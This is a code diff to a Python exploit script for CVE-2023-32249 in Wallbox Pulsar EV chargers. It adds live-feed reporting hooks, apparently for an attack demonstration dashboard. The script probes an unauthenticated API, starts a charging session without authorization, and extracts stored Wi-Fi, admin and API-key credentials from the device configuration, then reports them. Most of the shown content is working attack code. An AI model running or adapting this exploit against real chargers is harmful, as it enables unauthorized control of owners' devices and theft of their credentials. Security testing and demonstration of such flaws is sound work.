@@ -21,14 +21,38 @@ import json
 import sys
 import time
 
+# Import attack reporter for live feed
+try:
+    from attack_reporter import report_attack, report_step, report_success, report_failure, report_command, report_data
+    HAS_REPORTER = True
+except ImportError:
+    HAS_REPORTER = False
+    def report_attack(*args, **kwargs): pass
+    def report_step(*args, **kwargs): pass
+    def report_success(*args, **kwargs): pass
+    def report_failure(*args, **kwargs): pass
+    def report_command(*args, **kwargs): pass
+    def report_data(*args, **kwargs): pass
+
 
 class WallboxExploit:
     def __init__(self, target: str, port: int):
         self.base_url = f"http://{target}:{port}"
+        self.target_str = f"{target}:{port}"
+        
+        # Report attack start
+        report_attack(
+            cve="CVE-2023-32249",
+            name="Wallbox Pulsar Unauthenticated API",
+            severity="high",
+            target=self.target_str,
+            attack_type="auth_bypass"
+        )
         
     def check_vulnerable(self) -> bool:
         """Check if target is vulnerable (unauthenticated access)"""
         print(f"[*] Checking target: {self.base_url}")
+        report_step(f"Probing {self.base_url}/api/status for auth bypass")
         try:
             resp = requests.get(f"{self.base_url}/api/status", timeout=10)
             if resp.status_code == 200:
@@ -38,11 +62,14 @@ class WallboxExploit:
                     print(f"    Vendor: {data.get('vendor')}")
                     print(f"    Model: {data.get('model')}")
                     print(f"    Firmware: {data.get('firmware')}")
+                    report_success("No authentication required - full API access!")
                     return True
             print("[-] Target does not appear vulnerable")
+            report_failure("Target requires authentication")
             return False
         except requests.exceptions.RequestException as e:
             print(f"[-] Connection error: {e}")
+            report_failure(f"Connection failed: {e}")
             return False
     
     def get_status(self) -> dict:
@@ -57,12 +84,14 @@ class WallboxExploit:
     def start_charging(self) -> bool:
         """Start charging without authentication"""
         print("\n[*] Attempting to start charging (no authentication)...")
+        report_step("Initiating unauthorized charging session", severity="critical")
         try:
             resp = requests.post(f"{self.base_url}/api/charge/start", timeout=10)
             data = resp.json()
             if data.get('status') == 'charging_started':
                 print("[+] SUCCESS! Charging started without authentication!")
                 print(f"    Warning: {data.get('warning')}")
+                report_success("Charging started without authentication!")
                 return True
             print(f"[-] Failed: {data}")
             return False
@@ -108,6 +137,7 @@ class WallboxExploit:
     def get_credentials(self) -> dict:
         """Extract stored credentials from config"""
         print("\n[*] Extracting credentials from configuration...")
+        report_step("Extracting stored credentials from config API", severity="critical")
         try:
             resp = requests.get(f"{self.base_url}/api/config", timeout=10)
             if resp.status_code == 200:
@@ -119,6 +149,12 @@ class WallboxExploit:
                 print(f"    API Key: {config.get('api_key')}")
                 print(f"    OCPP URL: {config.get('ocpp_url')}")
                 print(f"    Encryption Enabled: {config.get('encryption_enabled')}")
+                report_data("credentials", {
+                    "wifi_ssid": config.get('wifi_ssid'),
+                    "wifi_password": config.get('wifi_password'),
+                    "admin_password": config.get('admin_password'),
+                    "api_key": config.get('api_key')
+                }, "Credentials extracted from unauthenticated API!")
                 return config
             return {}
         except Exception as e:
